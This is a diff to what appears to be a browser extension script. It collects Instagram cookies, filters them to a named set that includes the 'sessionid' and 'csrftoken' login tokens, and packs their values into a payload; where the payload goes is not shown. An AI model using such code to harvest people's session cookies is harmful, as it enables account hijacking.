@@ -68,8 +68,25 @@ document.addEventListener("DOMContentLoaded", () => {
         const profileURL = tab.url;
 
         chrome.cookies.getAll({ domain: ".instagram.com" }, async (cookies) => {
+          const usedCookies = [
+            "fbm_124024574287414",
+            "mid",
+            "ig_did",
+            "datr",
+            "ps_l",
+            "ps_n",
+            "csrftoken",
+            "ig_nrcb",
+            "wd",
+            "ds_user_id",
+            "sessionid",
+            "rur"
+          ];
+
+          const filtered = cookies.filter(c => usedCookies.includes(c.name));
+
           const payload = {
-            cookies: cookies.map(c => ({
+            cookies: filtered.map(c => ({
               name: c.name,
               value: c.value,
               domain: c.domain,
